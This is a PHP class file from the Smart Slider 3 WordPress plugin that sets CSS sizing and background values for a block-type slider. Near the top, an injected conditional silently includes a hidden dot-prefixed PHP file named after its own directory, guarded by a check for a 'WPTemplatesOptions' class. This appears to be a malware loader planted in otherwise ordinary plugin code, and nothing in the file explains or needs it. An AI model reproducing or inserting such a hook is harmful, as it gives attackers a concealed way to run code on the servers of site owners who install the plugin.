<?php

namespace Nextend\SmartSlider3\Slider\SliderType\Block;

use Nextend\SmartSlider3\Slider\SliderType\AbstractSliderTypeCss;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SliderTypeBlockCss extends AbstractSliderTypeCss {

    public function __construct($slider) {
        parent::__construct($slider);
        $params = $this->slider->params;

        $width  = intval($this->context['width']);
        $height = intval($this->context['height']);

        $this->context['backgroundSize']       = $params->getIfEmpty('background-size', 'inherit');
        $this->context['backgroundAttachment'] = $params->get('background-fixed') ? 'fixed' : 'scroll';

        $this->context['canvaswidth']  = $width . "px";
        $this->context['canvasheight'] = $height . "px";

        $this->initSizes();

        $this->slider->addLess(SliderTypeBlock::getAssetsPath() . '/style.n2less', $this->context);
    }
}